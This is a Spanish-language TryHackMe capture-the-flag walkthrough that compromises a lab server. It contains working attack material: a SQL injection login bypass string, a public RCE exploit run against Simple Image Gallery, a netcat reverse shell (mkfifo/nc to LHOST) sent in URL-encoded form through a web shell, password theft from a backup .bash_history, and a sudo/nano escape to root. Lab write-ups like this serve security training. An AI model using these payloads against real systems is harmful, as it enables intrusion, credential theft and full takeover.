Bienvenidos a otra sala en tryhackme. Como siempre, analizamos puertos abiertos con nuestra herramienta bien conocida. Navegamos al servidor web para luego ejecutar una consulta injection SQL e ingresar como usuario administrator. Realizamos un busqueda de vulnerabilidad del servidorweb y obtenemos nuestra reverse shell via RCE. Por ultimo,  encontramos las credenciales del usuario para luego escalar privilegios ejecutando un binario que, dentro de el, escalamos a root con  `nano`
# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`


```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-10 07:23:10 EDT for 29s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra dos puertos http abiertos. Navegaremos al servidor web con el puerto 8080 y podemos ver que nos reedirige a pagina de logeo. No hara falta iniciar una busqueda de directorios o en busca de usuario, al probar SQLi podremos entrar al servidor web.

# Intrusion

Para hacer uso de SQLi y poder acceder como administrador, tendremos que ejecutar una simple consulta en la seccion de usuario. No hace falta que pongamos una password:

```bash
' or '1'='1'-- -
```

Ejecutando esa query, podemos logearnos dentro del servidor como usuario adminitrator.

Una vez dentro, tenemos que encontrar la forma de generar una reverse shell en nuestra maquina atacante. Podemos ver el nombre del servicio que estan utilizando "SImple Image gallery", no tenemos la version, pero buscamos por `searchsploit` hasta encontrar el que funcione y lo transferimos a nuestra maquina.

```bash
searchsploit Simple Image Gallery

Exploit Title                                        Path
Joomla Plugin Simple Image Gallery                   php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery   php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution     'php/webapps/50214.py'
Simple Image Gallery System 1.0 - 'id' SQL Injection php/webapps/50198.txt


serachsploit -m php/webapps/50214.py
```

Utilizamos este exploit que nos pedira el TARGET(URL) y nos dara un link en el que podemos ejecutar comandos. Luego, copiamos nuestra reverse shell para cargarla al servidor web y ejecutarla mediante la URL para acceder como usuario `www-data` en nuestra maquina atacante.

```bash
# Ejecutamos el exploit
python3 50214.py 
TARGET = http://IPTARGET/gallery
- OK -
Shell URL : http://IPTARGET/gallery/uploads/1688988900_ctLetta...php?cmd=whoami

# Lanzamos un curl para ver la respuesta del servidor
curl http://IPTARGET/gallery/uploads/1688988900_ctLetta....php?cmd=whoami
<pre>www-data
</pre>

# Abrimos Burp-Suite y encodeamos nuestra shell en formato URL
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f
"%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%..."

# Nos ponemos en escucha
nc -nvlp LPORT

# Ejecutamos nuestro shell en nuestro navegador:
http://IPTARGET/gallery/uploads/1688988900_ctLetta.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%...

```

## Mike

Upgradeamos nuestra shell:

```bash
script /dev/null -c bash
  CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```

Luego de una enumeracion exhaustiva, nos dirigmos a /var/backups y habra un directorio que pertenece a mike. Listamos archivos ocultos  y podemos ver la password que utiliza gracias a un error de su parte. Va a haber una trampa para conejos en /documets de una password desactualizada.

```bash
# Cambiamos de directorio y listamos
cd /var/backups/mike_home_backup
ls -lah 

drwxr-xr-x 5 root root 4.0K May 24  2021 .
drwxr-xr-x 3 root root 4.0K Jul 10 11:22 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3.7K May 24  2021 .bashrc
drwxr-xr-x 3 root root 4.0K May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4.0K May 24  2021 documents
drwxr-xr-x 2 root root 4.0K May 24  2021 images

# Leemos archivo
cat .bash_history

# Obtenemos password y cambiamos a usuario mike
su mike

```

# Priv.Escalation

Listamos permisos de superusuario, vemos donde tiene alojados los permisos. Si ejecutamos el binario nos indicara si queremos listar, upgradear o leer. Observamos el binario con  `cat`, en el que si seleccionamos read, nos llevara al directorio /root que es lo que nos interesa. 

Claramente, si lo ejecutamos asi como esta, no nos llevara al usuario root. 
Lo que tenemos que hacer, es ejecutar el binario como superusuario root en /bin/bash. Una vez que nos abra el /report.txt tendremos que abusarnos de `nano` y obtener una shell interactiva /root para reclamar nuestra flag.

```bash
# Ejecutamos binario como superusuario root en /bin/bash
sudo -u root /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ?: read

# Abusamos de nano para obtener una sesion interactiva
CTRL+R
CTRL+X
reset; sh 1>&0 2>&0
```

Es media inestable, asique la upgradeamos.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```